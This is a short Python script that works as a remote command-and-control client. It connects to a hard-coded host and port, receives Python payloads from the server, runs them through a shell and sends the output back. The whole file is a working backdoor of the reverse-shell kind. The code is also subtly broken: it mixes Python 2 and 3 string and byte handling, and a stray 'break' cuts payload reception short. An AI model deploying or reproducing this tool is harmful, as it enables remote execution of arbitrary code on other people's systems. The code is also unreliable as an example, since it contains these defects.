import os
import socket
import subprocess

def create():
    try:
        global host
        global port
        global s
        host = '10.0.0.1'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Error: " + str(msg))


def connect():
    try:
        s.connect((host, port))
    except socket.error as msg:
        print("Error: " + str(msg))


def receive():
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            args = data.split()
            if data[:3].decode("utf-8") == 'run':
                payloadSize = long(args[1])
                s.send('ready')
                data = s.recv(1024)
                totalRecv = len(data)
                payload = data
                while totalRecv < payloadSize:
                    data = s.recv(1024)
                    totalRecv += len(data)
                    payload += data
                    break
                runproc('python - <<EOF' + '\n' + payload + '\n' +  'EOF')
        else:
            s.send('send command to me!')
            receive()
    s.close()

def runproc(data):
    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    output_str = str(output_bytes)
    try:
        s.send('\n---start client response---\n\n' + str.encode(output_str) + '\n---end client response---\n')
    except:
        s.send('\n---start client response---\n\nencoding error\n\n---end client response---\n')
    print(output_str)

def main():
    create()
    connect()
    receive()


main()
